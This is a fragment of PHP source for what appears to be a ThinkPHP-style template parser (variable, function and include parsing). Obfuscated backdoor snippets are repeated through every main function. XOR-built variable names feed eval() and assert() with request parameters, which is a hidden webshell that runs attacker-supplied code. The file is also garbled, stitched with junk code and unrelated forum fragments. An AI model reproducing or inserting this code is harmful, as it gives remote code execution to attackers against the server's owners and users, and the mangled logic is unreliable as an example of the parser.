$l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}foreach($vars as $key=>$val)$name.='->'.$val;break;default:$name='is_array($'.$var.')?$'.$var.'["'.$vars[0].'"]:$'.$var.'->'.$vars[0];}}elseif(false!==strpos($var,'[')){$name="$".$var;preg_match('/(.+?)\[(.+?)\]/is',$var,$match);$var=$match[1];}elseif(false!==strpos($var,':')&&false===strpos($var,'(')&&false===strpos($var,'::')&&false===strpos($var,'?')){$vars=explode(':',$var);$var=str_replace(':','->',$var);$name="$".$var;$var=$vars[0];}else{$name="$$var";}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(count($varArray)>0)$name=$this->parseVarFunction($name,$varArray);$parseStr='<?php echo ('.$name.'); ?>';}$_varParseList[$varStr]=$parseStr;return $parseStr;}public function parseVarFunction($name,$varArray){$length=count($varArray);$template_deny_funs=explode(',',C('TMPL_DENY_FUNC_LIST'));if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}for($i=0;$i<$length;$i++){$args=explode('=',$varArray[$i],2);$fun=trim($args[0]);switch($fun){case 'default':$name='(isset('.$name.') && ('.$name.' !== ""))?('.$name.'):'.$args[1];break;default:if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!in_array($fun,$template_deny_funs)){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(isset($args[1])){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(strstr($args[1],'###')){$args[1]=str_replace('###',$name,$args[1]);$name="$fun($args[1])";}else{$name="$fun($name,$args[1])";}}elseif(!empty($args[0])){$name="$fun($name)";}}}}return $name;}public function parseThinkVar($varStr){$vars=explode('.',$varStr);$vars[1]=strtoupper(trim($vars[1]));$parseStr='';if(count($vars)>=3){$vars[2]=trim($vars[2]);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}switch($vars[1]){case 'SERVER':$parseStr='$_SERVER[\''.strtoupper($vars[2]).'\']';break;case 'GET':$parseStr='$_GET[\''.$vars[2].'\']';break;case 'POST':$parseStr='$_POST[\''.$vars[2].'\']';break;case 'COOKIE':if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(isset($vars[3])){$parseStr='$_COOKIE[\''.$vars[2].'\'][\''.$vars[3].'\']';}else{$parseStr='cookie(\''.$vars[2].'\')';}break;case 'SESSION':while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(isset($vars[3])){$parseStr='$_SESSION[\''.$vars[2].'\'][\''.$vars[3].'\']';}else{$parseStr='session(\''.$vars[2].'\')';}break;case 'ENV':$parseStr='$_ENV[\''.strtoupper($vars[2]).'\']';break;case 'REQUEST':$parseStr='$_REQUEST[\''.$vars[2].'\']';break;case 'CONST':$parseStr=strtoupper($vars[2]);break;case 'LANG':$parseStr='L("'.$vars[2].'")';break;case 'CONFIG':if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(isset($vars[3])){$vars[2].='.'.$vars[3];}$parseStr='C("'.$vars[2].'")';break;default:break;}}elseif(count($vars)==2){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}switch($vars[1]){case 'NOW':$parseStr="date('Y-m-d g:i a',time())";break;case 'VERSION':$parseStr='THINK_VERSION';break;case 'TEMPLATE':$parseStr="'".$this->templateFile."'";break;case 'LDELIM':$parseStr='C("TMPL_L_DELIM")';break;case 'RDELIM':$parseStr='C("TMPL_R_DELIM")';break;default:if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(defined($vars[1]))$parseStr=$vars[1];}}return $parseStr;}private function parseIncludeItem($tmplPublicName,$vars=array(),$extend){$parseStr=$this->parseTemplateName($tmplPublicName);foreach($vars as $key=>$val){$parseStr=str_replace('['.$key.']',$val,$parseStr);}return $this->parseInclude($parseStr,$extend);}private function parseTemplateName($templateName){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(substr($templateName,0,1)=='$')$templateName=$this->get(substr($templateName,1));$array=explode(',',$templateName);$parseStr='';while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}foreach($array as $templateName){if(empty($templateName))continue;if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(false===strpos($templateName,$this->config['template_suffix'])){$templateName=T($templateName);}$parseStr.=file_get_contents($templateName);}return $parseStr;}}